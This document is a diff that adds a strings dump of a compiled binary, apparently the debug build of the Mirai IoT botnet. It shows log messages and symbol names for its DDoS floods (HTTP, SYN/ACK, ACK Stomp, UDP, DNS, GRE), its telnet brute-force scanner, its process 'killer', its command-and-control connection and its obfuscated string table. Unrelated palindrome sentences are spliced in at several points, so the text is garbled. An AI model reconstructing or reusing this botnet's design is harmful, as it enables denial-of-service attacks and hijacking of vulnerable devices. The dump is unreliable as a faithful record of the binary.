@@ -1,0 +1,2934 @@
+PTRh
+QVhf3
+<`~3
+RPhL
+<=t'
+</uy
+<"u^
+<"u'
+</uy
+[^_]
+<	u/
+RPhL
+[^_]
+[^_]
+h**RJ
+Beeb
+4[^_]
+[^_]
+SVRQPh@
+RPh|
+QRPh
+[^_]
+<:t8
+<>t*
+<%u	
+<:t8
+<>t*
+<%u	
+<:t*
+<#u	
+j	h[
+j h0
+j0hT
+joh(
+jnhx
+D$ P
+PRQW
+T$(S
+WVS1
+RPho
+UWVS
+[^_]
+QPRS
+^8PSh
+t$,V
+UWVS
+t$$S
+[^_]
+UWVS
+T$`~
+D$(%
+WVPR
+$VRP
+?0u+
+VVhF
+D$ P
+PQRR
+QQRW
+[^_]
+tP~N
+t@~>=
+UWVS
+<$u0
+\$L9
+~	<mtN
+:*u4
+T$X:
+L$pE
+D$`P
+L$p)
+\[^_]
+UWVS
+D$gP
+[^_]
+\$HPh
+D$)P
+D$ P
+D$ Pj
+D$ Pj
+UWVS
+\$Thp
+D$8P
+;-07
+T$ !
+#t$ 
+2#D$ 
+D$8P
+[^_]
+UWVS
+;5,7
+t$8R
+$9D$
+t$8S
+\$0PPj
+[^_]
+UWVS
+[^_]
+UWVS
+u=9J
+;X,tQ
+[^_]
+UWVS
+u<9J
+;5,7
+SSPQ)
+[^_]
+uXRh
+UWVS
+ <xu
+(<`v
+}/C;T$
+D$,!
+[^_]
+t$$h
+UWVS
+u%WWSS
+ZYSS
+[^_]
+yPPj
+PPSh
+UWVS
+Qjxj
+D$ P
+t@;D$xu
+t$\Q
+[^_]
+T$(S
+T$$S
+t$Dj
+D$<PR
+t$(j
+UWVS
+\$89
+[^_]
+UWVS
+)\$(
+[^_]
+UWVS
+PVUR
+whQWUR
+[^_]
+[^_]
+UWVS
+[^_]
+UWVS
+e<au
+u*z(
+u?z=
+D$Pp
+|$6f
+l$61
+D$(RP
+} Pj
+D$'g
+D$'f)
+D$\p
+|$d9
+T$`)
+L$t1
+|$'fto
+[^_]
+UWVS
+.u5A
+Z[^_]
+UWVS
+^8PSh
+D$(PV
+x6RW
+D$(PV
+[^_]
+WVS1
+[attack] Killing all ongoing attacks
+[attack] Starting attack...
+[http flood] fd%d started connect
+ HTTP/1.1
+User-Agent: 
+Host: 
+Cookie: 
+sending buf: "%s"
+[http flood] FD%d connected.
+[http flood] FD%d error while connecting = %d
+[http flood] headers: "%s"
+http
+url=
+POST
+[http flood] FD%d connection gracefully closed
+[http flood] FD%d lost connection
+[http flood] HTTP_CONN_QUEUE_RESTART FD%d connection gracefully closed
+[http flood] HTTP_CONN_QUEUE_RESTART FD%d lost connection
+debug mode sleep
+POST /cdn-cgi/
+Failed to create raw socket. Aborting attack
+Failed to set IP_HDRINCL. Aborting
+errno = %d
+Failed to create raw socket. Aborting attack
+Failed to set IP_HDRINCL. Aborting
+Could not open raw socket!
+Failed to create socket!
+Could not listen on raw socket!
+ACK Stomp got SYN+ACK!
+Couldn't connect to host for ACK Stomp in time. Retrying
+Failed to create raw socket. Aborting attack
+Failed to set IP_HDRINCL. Aborting
+Cannot send DNS flood without a domain
+in udp plain
+after args
+Failed to create udp socket. Aborting attack
+Failed to bind udp socket.
+Failed to connect udp socket.
+after setup
+send failed: %d
+Found local resolver: '%s'
+[killer] Trying to kill port 23
+[killer] Killed tcp/23 (telnet)
+[killer] Failed to kill port 23
+[killer] Bound to tcp/23 (telnet)
+[killer] Machine does not have /proc/$pid/exe
+[killer] Memory scanning processes
+[killer] Failed to open /proc!
+[killer] Finished
+[killer] %d seconds have passed since last scan. Re-scanning all processes!
+[killer] Process '%s' has deleted binary!
+[killer] Memory scan match for binary %s
+[killer] Finding and killing processes holding port %d
+/proc/net/tcp
+Failed to find inode for port %d
+Found inode "%s" for port %d
+[killer] Found pid %d for port %d
+[killer] Failed to open()
+[killer] Detected we are running out of `%s`
+Got SIGSEGV at address: 0x%lx
+DEBUG MODE YO
+sigaction
+select() errno = %d
+[main] Detected newer instance running! Killing self
+[main] Timed out while connecting to CNC
+[main] Error while connecting to CNC code=%d
+[main] Connected to CNC. Local address = %d
+[main] Lost connection with CNC (errno = %d) 1
+[main] Lost connection with CNC (errno = %d) 2
+[main] Received %d bytes from CNC
+[main] Failed to resolve CNC address
+[main] Resolved domain
+[main] Attempting to connect to CNC
+[main] Failed to call socket(). Errno = %d
+[main] Tearing down connection to CNC!
+[main] Another instance is already running (errno = %d)! Sending kill request...
+[main] Failed to connect to fd_ctrl to request process termination
+[main] Failed to call listen() on fd_ctrl
+[main] We are the only process on this system!
+abcdefghijklmnopqrstuvw012345678
+www.srv.mirai
+[resolv] domain: %s
+[resolv] Found IP address: %08x
+[resolv] Failed to create socket
+[resolv] Failed to call connect on udp socket
+[resolv] Failed to send packet: %d
+[resolv] select() failed
+[resolv] Couldn't resolve %s in time. %d tr%s
+[resolv] Got response from select
+Resolved %s to %d IPv4 addresses
+[scanner] Failed to initialize raw socket, cannot scan
+[scanner] Failed to set IP_HDRINCL, cannot scan
+PMMV
+[scanner] Scanner process initialized. Scanning started.
+[scanner] FD%d Attempting to brute found IP %d.%d.%d.%d
+[scanner] FD%d timed out (state = %d)
+[scanner] FD%d retrying with different auth combo!
+[scanner] FD%d connected. Trying %s:%s
+[scanner] FD%d error while connecting = %d
+[scanner] FD%d connection gracefully closed
+[scanner] FD%d lost connection
+[scanner] FD%d finished telnet negotiation
+[scanner] FD%d received username prompt
+[scanner] FD%d received password prompt
+[scanner] FD%d received shell prompt
+[scanner] FD%d received sh prompt
+[scanner] FD%d received enable prompt
+[scanner] FD%d invalid username/password combo
+[scanner] FD%d Found verified working telnet
+[scanner] Failed to call socket()
+ogin
+enter
+assword
+[report] Failed to call socket()
+[report] Failed to resolve report address
+[report] Failed to connect to scanner callback!
+[report] Send scan result to loader
+OKPCK"
+NKQVGLKLE
+JVVRQ
+[MWVW
+uEzAs"
+RPMA
+GZG"
+FGNGVGF
+CLKOG"
+QVCVWQ"
+pgrmpv
+jvvrdnmmf"
+nmnlmevdm"
+XMNNCPF"
+egvnmacnkr"
+QJGNN"
+GLC@NG"
+Q[QVGO"
+@WQ[@MZ
+okpck"
+okpck
+CRRNGV
+DMWLF"
+LAMPPGAV"
+@WQ[@MZ
+@WQ[@MZ
+IKNN
+vqMWPAG
+gLEKLG
+sWGP["
+PGQMNT
+AMLD"
+LCOGQGPTGP
+aMLLGAVKML
+IGGR
+CNKTG"
+cAAGRV
+VGZV
+JVON
+CRRNKACVKML
+ZJVON	ZON
+CRRNKACVKML
+KOCEG
+UG@R
+cAAGRV
+nCLEWCEG
+aMLVGLV
+v[RG
+CRRNKACVKML
+DMPO
+WPNGLAMFGF"
+QGVaMMIKG
+PGDPGQJ
+NMACVKML
+AMMIKG
+AMLVGLV
+NGLEVJ
+VPCLQDGP
+GLAMFKLE
+AJWLIGF"
+IGGR
+CNKTG"
+AMLLGAVKML
+QGPTGP
+FMQCPPGQV"
+QGPTGP
+ANMWFDNCPG
+LEKLZ"
+oMXKNNC
+uKLFMUQ
+cRRNGuG@iKV
+ijvon
+NKIG
+eGAIM
+aJPMOG
+qCDCPK
+oMXKNNC
+uKLFMUQ
+cRRNGuG@iKV
+ijvon
+NKIG
+eGAIM
+aJPMOG
+qCDCPK
+oMXKNNC
+uKLFMUQ
+cRRNGuG@iKV
+ijvon
+NKIG
+eGAIM
+aJPMOG
+qCDCPK
+oMXKNNC
+uKLFMUQ
+cRRNGuG@iKV
+ijvon
+NKIG
+eGAIM
+aJPMOG
+qCDCPK
+oMXKNNC
+oCAKLVMQJ
+kLVGN
+cRRNGuG@iKV
+ijvon
+NKIG
+eGAIM
+tGPQKML
+qCDCPK
+[table] Tried to double-unlock value %d
+[table] Tried to double-lock value
+[table] Tried to access table.%d but it is locked
+[util] Failed to call socket(), errno = %d
+%s%s%m
+(nil)
+(null)
+hlLjztqZ
+npxXoudifFeEgGaACScs
+ +0-#'I
+Unknown error 
+Success
+Operation not permitted
+No such file or directory
+No such process
+Interrupted system call
+Input/output error
+No such device or address
+Argument list too long
+Exec format error
+Bad file descriptor
+No child processes
+Resource temporarily unavailable
+Cannot allocate memory
+Permission denied
+Bad address
+Block device required
+Device or resource busy
+File exists
+Invalid cross-device link
+No such device
+Not a directory
+Is a directory
+Invalid argument
+Too many open files in system
+Too many open files
+Inappropriate ioctl for device
+Text file busy
+File too large
+No space left on device
+Illegal seek
+Read-only file system
+Too many links
+Broken pipe
+Numerical argument out of domain
+Numerical result out of range
+Resource deadlock avoided
+File name too long
+No locks available
+Function not implemented
+Directory not empty
+Too many levels of symbolic links
+No message of desired type
+Identifier removed
+Channel number out of range
+Level 2 not synchronized
+Level 3 halted
+Level 3 reset
+Link number out of range
+Protocol driver not attached
+No CSI structure available
+Level 2 halted
+Invalid exchange
+Invalid request descriptor
+Exchange full
+No anode
+Invalid request code
+Invalid slot
+Bad font file format
+Device not a stream
+No data available
+Timer expired
+Out of streams resources
+Machine is not on the network
+Package not installed
+Object is remote
+Link has been severed
+Advertise error
+Srmount error
+Communication error on send
+Protocol error
+Multihop attempted
+RFS specific error
+Bad message
+Value too large for defined data type
+Name not unique on network
+File descriptor in bad state
+Remote address changed
+Can not access a needed shared library
+Accessing a corrupted shared library
+.lib section in a.out corrupted
+Attempting to link in too many shared libraries
+Cannot exec a shared library directly
+Invalid or incomplete multibyte or wide character
+Interrupted system call should be restarted
+Streams pipe error
+Too many users
+Socket operation on non-socket
+Destination address required
+Message too long
+Protocol wrong type for socket
+Protocol not available
+Protocol not supported
+Socket type not supported
+Operation not supported
+Protocol family not supported
+Address family not supported by protocol
+Address already in use
+Cannot assign requested address
+Network is down
+Network is unreachable
+Network dropped connection on reset
+Software caused connection abort
+Connection reset by peer
+No buffer space available
+Transport endpoint is already connected
+Transport endpoint is not connected
+God A red nugget A fat egg under a dog
+Cannot send after transport endpoint shutdown
+Too many references: cannot splice
+Connection timed out
+Connection refused
+Host is down
+No route to host
+Operation already in progress
+Operation now in progress
+Stale NFS file handle
+Structure needs cleaning
+Not a XENIX named type file
+No XENIX semaphores available
+Is a named type file
+Remote I/O error
+Disk quota exceeded
+No medium found
+Wrong medium type
+/dev/null
+L(knN
+ Ainf
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+GCC: (GNU) 4.1.2
+attack_init
+attack_kill_all
+attack_parse
+attack_start
+attack_get_opt_str
+attack_get_opt_int
+attack_get_opt_ip
+LOCAL_ADDR
+methods_len
+methods
+attack_ongoing
+attack_app_proxy
+attack_app_http
+attack_app_cfnull
+LOCAL_ADDR
+attack_gre_ip
+attack_gre_eth
+LOCAL_ADDR
+attack_tcp_syn
+attack_tcp_ack
+attack_tcp_stomp
+LOCAL_ADDR
+attack_udp_generic
+attack_udp_vse
+attack_udp_dns
+attack_udp_plain
+LOCAL_ADDR
+checksum_generic
+checksum_tcpudp
+LOCAL_ADDR
+killer_init
+killer_kill
+killer_kill_by_port
+LOCAL_ADDR
+killer_pid
+killer_realpath
+killer_realpath_len
+main
+LOCAL_ADDR
+srv_addr
+fd_ctrl
+fd_serv
+pending_connection
+resolve_func
+rand_init
+rand_next
+rand_str
+rand_alphastr
+LOCAL_ADDR
+resolv_domain_to_hostname
+resolv_lookup
+resolv_entries_free
+LOCAL_ADDR
+recv_strip_null
+scanner_init
+scanner_kill
+LOCAL_ADDR
+scanner_pid
+rsck
+rsck_out
+auth_table_len
+scanner_rawpkt
+auth_table
+conn_table
+auth_table_max_weight
+fake_time
+table_init
+table_unlock_val
+table_lock_val
+table_retrieve_val
+LOCAL_ADDR
+table_key
+table
+util_strlen
+util_strncmp
+util_strcmp
+util_strcpy
+util_memcpy
+util_zero
+util_atoi
+util_itoa
+util_memsearch
+util_stristr
+util_local_addr
+util_fdgets
+LOCAL_ADDR
+GNU C 4.1.2
+bot/attack.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__gnuc_va_list
+uint8_t
+uint16_t
+uint32_t
+va_list
+BOOL
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+	arp
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+in_port_t
+in_addr_t
+in_addr
+s_addr
+attack_target
+sock_addr
+addr
+netmask
+attack_option
+ATTACK_FUNC
+ATTACK_VECTOR
+attack_method
+func
+attack_init
+attack_kill_all
+attack_parse
+g	targs
+cleanup
+	val_len
+attack_start
+targs
+	pid1
+l	pid2
+attack_get_opt_str
+attack_get_opt_int
+	val
+attack_get_opt_ip
+	val
+add_attack
+func
+	method
+free_opts
+	outptr
+LOCAL_ADDR
+methods_len
+methods
+attack_ongoing
+GNU C 4.1.2
+bot/attack_app.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__time_t
+__suseconds_t
+__socklen_t
+__gnuc_va_list
+timeval
+tv_sec
+tv_usec
+__fd_mask
+fds_bits
+fd_set
+socklen_t
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+uint8_t
+uint16_t
+uint32_t
+va_list
+ipv4_t
+port_t
+xputc
+xputs
+xvprintf
+xprintf
+in_port_t
+in_addr_t
+in_addr
+s_addr
+attack_target
+sock_addr
+addr
+netmask
+attack_option
+attack_http_state
+state
+path
+method
+orig_method
+protection_type
+keepalive
+chunked
+content_length
+num_cookies
+cookies
+rdbuf_pos
+rdbuf
+attack_cfnull_state
+state
+to_send
+attack_app_proxy
+targs
+opts
+attack_app_http
+targs
+opts
+method
+path
+sockets
+dport
+nfds
+conn
+__d0
+__d1
+__d0
+__d1
+addr
+err_len
+processed
+con_ptr
+con_ptr
+len_ptr
+cookie_ptr
+equal_off
+cookie_exists
+loc_ptr
+loc_ptr
+wait_time
+consumed
+start_pos
+end_pos
+new_line_pos
+chunklen
+attack_app_cfnull
+targs
+opts
+sockets
+nfds
+conn
+__d0
+__d1
+__d0
+__d1
+addr
+sent
+rndbuf
+szbuf
+err_len
+outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/attack_gre.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__gnuc_va_list
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+__u8
+__u16
+__u32
+__be16
+__be32
+__sum16
+iphdr
+	U	ihl
+	version
+tot_len
+frag_off
+check
+saddr
+daddr
+ethhdr
+h_dest
+h_source
+h_proto
+uint8_t
+uint16_t
+uint32_t
+va_list
+BOOL
+ipv4_t
+port_t
+xputc
+xputs
+xvprintf
+xprintf
+in_port_t
+in_addr_t
+in_addr
+s_addr
+udphdr
+source
+dest
+check
+grehdr
+opts
+attack_target
+sock_addr
+addr
+netmask
+attack_option
+attack_gre_ip
+targs
+opts
+pkts
+ip_tos
+ip_ttl
+sport
+dport
+gcip
+greh
+udph
+greh
+udph
+data
+attack_gre_eth
+targs
+opts
+pkts
+ip_tos
+ip_ttl
+sport
+dport
+gcip
+greh
+ethh
+udph
+ent1
+ent2
+ent3
+greh
+ethh
+udph
+data
+ent1
+ent2
+ent3
+outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/attack_tcp.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__time_t
+__socklen_t
+time_t
+__gnuc_va_list
+socklen_t
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+__u8
+__u16
+__u32
+__be16
+__be32
+__sum16
+iphdr
+	U	ihl
+	version
+tot_len
+frag_off
+protocol
+check
+saddr
+daddr
+tcphdr
+source
+dest
+ack_seq
+	res1
+	doff
+	fin
+	syn
+	rst
+	psh
+	ack
+	urg
+	ece
+	cwr
+window
+check
+urg_ptr
+uint8_t
+Degas are we not drawn onward no In union drawn onward to new eras aged
+uint16_t
+uint32_t
+va_list
+BOOL
+ipv4_t
+port_t
+xputc
+xputs
+xvprintf
+xprintf
+in_port_t
+in_addr_t
+in_addr
+s_addr
+attack_target
+sock_addr
+addr
+netmask
+attack_option
+attack_stomp_data
+addr
+ack_seq
+sport
+attack_tcp_syn
+targs
+opts
+pkts
+sport
+opts
+attack_tcp_ack
+targs
+opts
+pkts
+sport
+payload
+data
+attack_tcp_stomp
+targs
+opts
+stomp_data
+pkts
+stomp_setup_nums
+addr
+recv_addr
+recv_addr_len
+pktbuf
+start_recv
+payload
+data
+outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/attack_udp.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__gnuc_va_list
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+uint8_t
+uint16_t
+uint32_t
+in_port_t
+in_addr_t
+in_addr
+s_addr
+__u8
+__u16
+__u32
+__be16
+__be32
+__sum16
+iphdr
+version
+tot_len
+Tacocat
+frag_off
+protocol
+check
+saddr
+daddr
+udphdr
+source
+dest
+check
+va_list
+BOOL
+ipv4_t
+port_t
+xputc
+xputs
+xvprintf
+xprintf
+dnshdr
+opts
+qdcount
+ancount
+nscount
+arcount
+dns_question
+qtype
+qclass
+attack_target
+sock_addr
+addr
+netmask
+attack_option
+attack_udp_generic
+opts
+pkts
+source_ip
+data
+attack_udp_vse
+opts
+pkts
+vse_payload
+vse_payload_len
+data
+attack_udp_dns
+opts
+pkts
+dns_hdr_id
+domain
+domain_len
+dns_resolver
+curr_word_len
+num_words
+dnsh
+qname
+curr_lbl
+dnst
+dnsh
+qrand
+attack_udp_plain
+opts
+pkts
+bind_addr
+data
+data
+get_dns_resolver
+nspos
+resolvbuf
+ipbuf
+finished_whitespace
+found
+outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/checksum.c
+/home/ken/Mirai-Source-Code/mirai
+signed char
+short int
+long long int
+unsigned char
+uint16_t
+short unsigned int
+uint32_t
+long long unsigned int
+long unsigned int
+long int
+char
+__u8
+__u16
+__u32
+__be16
+__be32
+__sum16
+iphdr
+version
+	tos
+	tot_len
+	frag_off
+	ttl
+	protocol
+#		check
+	saddr
+	daddr
+__gnuc_va_list
+va_list
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+checksum_generic
+addr
+count
+checksum_tcpudp
+buff
+data_len
+ip_src
+ip_dst
+length
+outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/killer.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__ino_t
+__off_t
+__gnuc_va_list
+uint16_t
+uint32_t
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+in_port_t
+in_addr_t
+in_addr
+s_addr
+dirent
+d_ino
+d_off
+d_reclen
+d_type
+d_name
+__dirstream
+va_list
+BOOL
+ipv4_t
+port_t
+xputc
+xputs
+xvprintf
+xprintf
+killer_init
+killer_highest_pid
+last_pid_scan
+tmp_bind_fd
+scan_counter
+tmp_bind_addr
+file
+exe_path
+ptr_exe_path
+realpath
+status_path
+ptr_status_path
+rp_len
+killer_kill
+killer_kill_by_port
+port
+fd_dir
+entry
+fd_entry
+path
+buffer
+inode
+port_str
+column_index
+in_column
+listening_state
+fd_str
+has_exe_access
+path
+k_rp_len
+memory_scan_match
+path
+rdbuf
+m_qbot_report
+m_qbot_http
+m_qbot_dup
+m_upx_str
+m_zollard
+m_qbot_len
+m_qbot2_len
+m_qbot3_len
+m_upx_len
+m_zollard_len
+found
+mem_exists
+buf_len
+str_len
+matches
+outptr
+LOCAL_ADDR
+killer_pid
+killer_realpath
+killer_realpath_len
+GNU C 4.1.2
+bot/main.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__uid_t
+__pid_t
+__clock_t
+__time_t
+__suseconds_t
+__socklen_t
+	__val
+__sigset_t
+__gnuc_va_list
+timeval
+J	tv_sec
+	tv_usec
+__fd_mask
+	D	fds_bits
+fd_set
+socklen_t
+sa_family_t
+sockaddr_in
+W	sin_family
+	sin_port
+	sin_addr
+	sin_zero
+uint8_t
+uint16_t
+uint32_t
+in_port_t
+in_addr_t
+in_addr
+	s_addr
+__sighandler_t
+sigval
+sival_int
+sival_ptr
+sigval_t
+G	si_tid
+	si_overrun
+	si_status
+	si_utime
+	si_stime
+a	si_addr
+g	si_band
+	si_fd
+_pad
+_kill
+_timer
+_sigchld
+_sigfault
+_sigpoll
+siginfo
+4	si_signo
+	si_errno
+	si_code
+	_sifields
+siginfo_t
+sa_handler
+sa_sigaction
+sigaction
+	__sigaction_handler
+	sa_mask
+	sa_flags
+	sa_restorer
+va_list
+BOOL
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+resolv_entries
+	addrs_len
+	addrs
+segv_handler
+unused
+main
+argc
+args
+tbl_exec_succ
+name_buf
+id_buf
+name_buf_len
+tbl_exec_succ_len
+pgid
+pings
+fdsetrd
+fdsetwr
+fdsetex
+timeo
+nfds
+__d0
+__d1
+__d0
+__d1
+cli_addr
+cli_addr_len
+err_len
+id_len
+rdbuf
+anti_gdb_entry
+ sig
+resolve_cnc_addr
+entries
+!establish_connection
+!teardown_connection
+ensure_single_instance
+addr
+local_bind
+unlock_tbl_if_nodebug
+ argv0
+buf_src
+buf_dst
+fold
+obf_funcs
+matches
+outptr
+#LOCAL_ADDR
+#srv_addr
+#fd_ctrl
+#fd_serv
+#pending_connection
+#resolve_func
+GNU C 4.1.2
+bot/rand.c
+/home/ken/Mirai-Source-Code/mirai
+signed char
+short int
+long long int
+uint8_t
+unsigned char
+short unsigned int
+uint32_t
+long long unsigned int
+long unsigned int
+long int
+char
+__gnuc_va_list
+va_list
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+	arp
+rand_init
+rand_next
+rand_str
+rand_alphastr
+	alphaset
+`	entropy
+	tmp
+	outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/resolv.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__time_t
+__suseconds_t
+__gnuc_va_list
+uint8_t
+uint16_t
+uint32_t
+timeval
+tv_sec
+tv_usec
+__fd_mask
+fds_bits
+fd_set
+sa_family_t
+sockaddr_in
+sin_family
+sin_port
+sin_addr
+sin_zero
+in_port_t
+in_addr_t
+in_addr
+s_addr
+va_list
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+resolv_entries
+addrs_len
+addrs
+dnshdr
+opts
+qdcount
+ancount
+nscount
+arcount
+dns_question
+qtype
+qclass
+dns_resource
+type
+_class
+data_len
+resolv_domain_to_hostname
+dst_hostname
+src_domain
+dst_pos
+curr_len
+resolv_skip_name
+reader
+buffer
+count
+jumped
+offset
+resolv_lookup
+domain
+entries
+query
+response
+dnsh
+qname
+dnst
+addr
+query_len
+tries
+dns_id
+tmp_buf
+fdset
+timeo
+nfds
+__d0
+__d1
+__result
+name
+dnsans
+dnsa
+ancount
+stop
+r_data
+tmp_buf
+resolv_entries_free
+entries
+outptr
+LOCAL_ADDR
+GNU C 4.1.2
+bot/scanner.c
+/home/ken/Mirai-Source-Code/mirai
+short unsigned int
+long unsigned int
+long int
+char
+long long int
+unsigned char
+signed char
+short int
+long long unsigned int
+__time_t
+__suseconds_t
+__socklen_t
+__gnuc_va_list
+socklen_t
+timeval
+J	tv_sec
+	tv_usec
+__fd_mask
+	D	fds_bits
+fd_set
+sa_family_t
+sockaddr_in
+W	sin_family
+	sin_port
+	sin_addr
+	sin_zero
+uint8_t
+uint16_t
+uint32_t
+in_port_t
+in_addr_t
+in_addr
+	s_addr
+__u8
+__u16
+__u32
+__be16
+__be32
+__sum16
+iphdr
+version
+	tos
+	tot_len
+	frag_off
+	ttl
+	protocol
+#		check
+	saddr
+	daddr
+tcphdr
+	source
+	dest
+	seq
+	ack_seq
+res1
+doff
+	window
+	check
+	urg_ptr
+va_list
+BOOL
+ipv4_t
+xputc
+xputs
+xvprintf
+xprintf
+scanner_auth
+	username
+	password
+	weight_min
+	weight_max
+	username_len
+	password_len
+SC_CLOSED
+SC_CONNECTING
+SC_HANDLE_IACS
+SC_WAITING_USERNAME
+SC_WAITING_PASSWORD
+SC_WAITING_PASSWD_RESP
+SC_WAITING_ENABLE_RESP
+SC_WAITING_SYSTEM_RESP
+SC_WAITING_SHELL_RESP
+SC_WAITING_SH_RESP
+SC_WAITING_TOKEN_RESP
+scanner_connection
+	auth
+	last_recv
+	state
+	dst_addr
+	dst_port
+	rdbuf_pos
+	rdbuf
+	tries
+resolv_entries
+	addrs_len
+	addrs
+recv_strip_null
+sock
+flags
+scanner_init
+source_port
+tcph
+fdset_rd
+fdset_wr
+last_avail_conn
+last_spew
+mfd_rd
+mfd_wr
+nfds
+paddr
+tcph
+dgram
+tcph
+__d0
+__d1
+__d0
+__d1
+timeout
+err_len
+scanner_kill
+setup_connection
+addr
+get_random_ip
+consume_iacs
